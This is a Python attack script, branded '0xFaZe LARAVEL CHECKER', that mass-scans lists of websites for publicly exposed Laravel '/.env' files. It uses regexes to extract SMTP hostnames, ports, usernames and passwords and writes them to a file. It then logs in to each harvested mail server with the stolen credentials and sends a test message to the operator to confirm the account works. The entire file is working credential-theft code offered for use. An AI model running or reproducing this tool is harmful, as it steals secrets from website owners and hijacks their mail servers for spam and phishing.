import os
import re
import requests
from colorama import Fore, init, Style
from multiprocessing import Pool
import sys
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
init()
yl = Fore.YELLOW
red = Fore.RED
gr = Fore.GREEN
res = Style.RESET_ALL

headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"}

def get_smtp(site, url):
    try:
        if "APP_NAME" in url:
            host = re.findall("\nMAIL_HOST=(.*?)\n", url)[0]
            port = re.findall("\nMAIL_PORT=(.*?)\n",url)[0]
            user = re.findall("\nMAIL_USERNAME=(.*?)\n", url)[0]
            pswd = re.findall("\nMAIL_PASSWORD=(.*?)\n", url)[0]
            encr = re.findall("\nMAIL_ENCRYPTION=(.*?)\n", url)[0]


            smtp = host+'|'+port+'|'+user+'|'+pswd+'|'+encr
            smtp = smtp.replace('\r', '').replace('"', '').replace("'", "")
            if "null" in smtp:
                print(f"{site} {yl}[NULL]{res}")
            else:
                print(f"{site} {gr}[SMTP]{res}")
                open("smtp.txt", "a+").write(smtp + "\n")
        else:
            print(f"{site} {yl}[NULL]{res}")
    except:
        pass
def ssl(smtp, reci):
    try:
        smtp = smtp.split("|")

        # Create a message object for each SMTP server
        message = MIMEMultipart()
        message["From"] = smtp[2]
        message["To"] = reci
        message["Subject"] = f"0xFaZe ({smtp[2]})"
        body = f"mail sent using 0xFaZe LARAVEL CHECKER {smtp}"
        message.attach(MIMEText(body, "plain"))

        try:
            # Connect to the SMTP server and send the message
            with smtplib.SMTP_SSL(smtp[0], int(smtp[1])) as server:
                server.login(smtp[2], smtp[3])
                server.sendmail(smtp[2], reci, message.as_string())
            print(f"{gr}Sent success {smtp[0]}{res}")
        except Exception as e:
            print(f"{red}Bad {smtp[0]}{res}")
    except:
        pass
def tls(smtp, reci):
    try:
        smtp = smtp.strip().split("|")
        message = MIMEMultipart()
        message["From"] = smtp[2]
        message["To"] = reci
        message["Subject"] = f"0xFaZe ({smtp[2]})"
        body = f"mail sent using 0xFaZe LARAVEL CHECKER {smtp}"
        message.attach(MIMEText(body, "plain"))

        try:
            with smtplib.SMTP(smtp[0], int(smtp[1])) as server:
                server.starttls()
                server.login(smtp[2], smtp[3])
                server.sendmail(smtp[2], reci, message.as_string())
            print(f"{gr}Sent Success {smtp[0]}{res}")
        except Exception as e:
            print(f"{red}Bad {smtp[0]}{res}")
    except:
        pass
def check():
    try:
        try:
            if os.name == 'nt':
                os.system('cls')
            else:
                os.system('clear')
        except:
            pass
        print('''

 ██████╗ ██╗  ██╗███████╗ █████╗ ███████╗███████╗
██╔═████╗╚██╗██╔╝██╔════╝██╔══██╗╚══███╔╝██╔════╝
██║██╔██║ ╚███╔╝ █████╗  ███████║  ███╔╝ █████╗  
████╔╝██║ ██╔██╗ ██╔══╝  ██╔══██║ ███╔╝  ██╔══╝  
╚██████╔╝██╔╝ ██╗██║     ██║  ██║███████╗███████╗
 ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
                                                 
''')
        site = input(f"{gr}Enter SMTP List Format => smtp.host.com|port|user|password: {res}")
        reci = input(f"{gr}Enter Your Mail : {res}")
        smtps = open(site).readlines()
        for smtp in smtps:
            if "ssl" in smtp:
                ssl(smtp, reci)
            else:
                tls(smtp, reci)
    except:
        pass
def fix(site):
    if "://" in site:
        site = site
    else:
        site = "http://" + site
    site = site.replace("\n", "").replace("\r", "")
    try:
        url = requests.get(site + "/.env", headers=headers, timeout=12).text
        if "APP_KEY" in url:
            open('laravelsites.txt', 'a').write(site+'\n')
            get_smtp(site, url)
        else:

            print(f"{site} {red} [NOT LARAVEL]{res}")
    except:
        pass

def smtp_mail():
    try:
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')
    except:
        pass
    print('''

 ██████╗ ██╗  ██╗███████╗ █████╗ ███████╗███████╗
██╔═████╗╚██╗██╔╝██╔════╝██╔══██╗╚══███╔╝██╔════╝
██║██╔██║ ╚███╔╝ █████╗  ███████║  ███╔╝ █████╗  
████╔╝██║ ██╔██╗ ██╔══╝  ██╔══██║ ███╔╝  ██╔══╝  
╚██████╔╝██╔╝ ██╗██║     ██║  ██║███████╗███████╗
 ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
                                                 
''')
    sites = input(f"{gr}Enter IPS/Sites List : {res}")

    site = open(sites).readlines()
    Thread = 50

    try:
        ThreadPool = Pool(Thread)
        ThreadPool.map(fix, site)
        ThreadPool.close()
        ThreadPool.join()
    except:
        pass

def main():
    try:
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')
    except:
        pass
    print('''

 ██████╗ ██╗  ██╗███████╗ █████╗ ███████╗███████╗
██╔═████╗╚██╗██╔╝██╔════╝██╔══██╗╚══███╔╝██╔════╝
██║██╔██║ ╚███╔╝ █████╗  ███████║  ███╔╝ █████╗  
████╔╝██║ ██╔██╗ ██╔══╝  ██╔══██║ ███╔╝  ██╔══╝  
╚██████╔╝██╔╝ ██╗██║     ██║  ██║███████╗███████╗
 ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
                                                 
''')
    print(f"""{gr}
1. MASS GET LARAVEL SMTP
2. MASS SMTP CHECKER
3. EXIT   
    {res}""")
    choice = int(input(f"{gr}ENTER YOUR CHOICE : {res}"))
    if choice == 1:
        smtp_mail()
    elif choice == 2:
        check()
    elif choice == 3:
        sys.exit("Exit")
    else:
        sys.exit("Wrong Input :(")


if __name__ == "__main__":
    main()
